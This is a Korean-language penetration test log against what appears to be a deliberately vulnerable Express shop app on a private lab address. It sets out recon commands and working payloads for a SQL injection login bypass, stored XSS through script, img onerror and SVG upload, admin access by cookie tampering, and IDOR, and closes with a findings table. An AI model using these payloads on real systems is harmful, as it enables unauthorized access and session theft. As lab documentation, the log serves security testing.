# 공격 과정 기록

## 테스트 일시
2025-12-11

## 1단계: 초기 정찰

### 1.1 메인 페이지 분석
```bash
curl -s -H "X-Forwarded-For: 10.0.0.101" "http://192.168.0.28:3000"
```
- 플랫폼: Express (Node.js)
- 보안 레벨: v1
- 상품 목록과 네비게이션 확인

### 1.2 디렉토리 스캔
```bash
gobuster dir -u "http://192.168.0.28:3000" -w /usr/share/wordlists/dirb/common.txt \
  -H "X-Forwarded-For: 10.0.0.101"
```

발견된 엔드포인트:
- /board - Q&A 게시판
- /login - 로그인
- /signup - 회원가입
- /profile - 프로필 (인증 필요)
- /order - 주문 (인증 필요)
- /uploads/ - 업로드 디렉토리

### 1.3 소스코드 힌트 발견
Q&A 게시판 소스코드에서 취약점 힌트 발견:
```html
<!-- VULNERABILITY: Unescaped output allows XSS (except v3) -->
```

---

## 2단계: SQL Injection 테스트

### 2.1 로그인 폼 테스트
```bash
curl -X POST -H "X-Forwarded-For: 10.0.0.101" \
  -d "username=admin'--&password=test" \
  "http://192.168.0.28:3000/login" -v
```

### 2.2 결과
응답 헤더:
```
Set-Cookie: user=admin; Path=/
Set-Cookie: isAdmin=false; Path=/
Set-Cookie: user_id=1; Path=/
Location: /
```
**성공!** admin 계정으로 로그인됨

---

## 3단계: XSS 테스트

### 3.1 게시판 XSS
```bash
curl -X POST -H "X-Forwarded-For: 10.0.0.101" \
  -d "content=<script>alert('XSS')</script>" \
  "http://192.168.0.28:3000/board"
```

### 3.2 검증
```bash
curl -s "http://192.168.0.28:3000/board" | grep "script"
# 출력: <script>alert('XSS')</script>
```
**성공!** Stored XSS 확인

### 3.3 img onerror XSS
```bash
curl -X POST -d "content=<img src=x onerror=alert('XSS')>" \
  "http://192.168.0.28:3000/board"
```
**성공!**

---

## 4단계: 권한 상승 테스트

### 4.1 쿠키 분석
로그인 후 발급되는 쿠키:
- `user`: 사용자명
- `isAdmin`: 관리자 여부 (true/false)
- `user_id`: 사용자 ID

### 4.2 쿠키 조작
```bash
# isAdmin=false 상태
curl -H "Cookie: user=admin; isAdmin=false; user_id=1" \
  "http://192.168.0.28:3000/profile"
# 결과: 일반 메뉴만 표시

# isAdmin=true로 변경
curl -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  "http://192.168.0.28:3000/profile"
# 결과: "Manage Products", "Manage Users" 메뉴 노출
```
**성공!** 관리자 권한 획득

### 4.3 관리자 페이지 접근
```bash
curl -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  "http://192.168.0.28:3000/admin/users"
```
- 전체 사용자 목록 획득
- 사용자 삭제 기능 접근 가능

---

## 5단계: IDOR 테스트

### 5.1 주문 정보 접근
```bash
# user_id=1(admin)의 주문 조회
curl -H "Cookie: user=guest; isAdmin=false; user_id=2" \
  "http://192.168.0.28:3000/order?id=1"
```

### 5.2 결과
다른 사용자의 주문 정보에 접근 가능:
- 주문 상품명
- 가격
- User ID (배송 정보)

**성공!** IDOR 취약점 확인

---

## 6단계: 파일 업로드 테스트

### 6.1 SVG XSS 업로드
```bash
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"><rect/></svg>' > xss.svg

curl -X POST -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  -F "profile_image=@xss.svg" \
  "http://192.168.0.28:3000/profile/upload"
```

### 6.2 결과
- 파일이 `/uploads/xss.svg`에 저장됨
- Content-Type: `image/svg+xml`
- 브라우저에서 접근 시 JavaScript 실행됨

**성공!** SVG를 통한 Stored XSS

---

## 7단계: 보안 헤더 분석

### Nikto 스캔 결과
```
- X-Frame-Options 헤더 없음 → Clickjacking 가능
- X-Content-Type-Options 헤더 없음 → MIME sniffing 가능
- X-Powered-By: Express 노출
```

---

## 발견된 취약점 요약

| # | 취약점 | 위험도 | 영향 |
|---|--------|--------|------|
| 1 | SQL Injection (Login Bypass) | Critical | 인증 우회 |
| 2 | Stored XSS (Q&A Board) | Critical | 세션 탈취 |
| 3 | Broken Access Control (Cookie) | Critical | 권한 상승 |
| 4 | IDOR (Order Details) | High | 정보 유출 |
| 5 | SVG File Upload XSS | High | 지속적 XSS |
| 6 | Missing Security Headers | Medium | 추가 공격 가능 |
| 7 | Information Disclosure | Medium | 기술 정보 노출 |
